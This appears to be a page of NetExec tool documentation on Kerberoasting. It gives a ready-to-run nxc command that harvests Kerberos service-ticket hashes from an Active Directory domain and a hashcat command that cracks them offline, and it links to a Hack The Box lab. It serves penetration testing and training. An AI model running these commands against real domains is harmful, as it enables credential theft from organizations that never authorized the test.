---
description: Retrieve the Kerberos 5 TGS-REP etype 23 hash using Kerberoasting
---

# Kerberoasting

You can retrieve the Kerberos 5 TGS-REP etype 23 hash using Kerberoasting technique

> The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets is encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline. More detail in [Kerberos theory](https://www.tarlogic.com/en/blog/how-kerberos-works/).

{% hint style="warning" %}
To perfom this attack, you need an account on the domain
{% endhint %}

```
nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
```

### Cracking with hashcat

```
hashcat -m13100 output.txt wordlist.txt
```

### Example

Active machine is a good example to test **Kerberoasting** with NetExec

{% embed url="https://www.hackthebox.eu/home/machines/profile/148" %}

### Useful ressources:

{% embed url="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/" %}

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting" %}

{% embed url="https://en.hackndo.com/kerberoasting/" %}
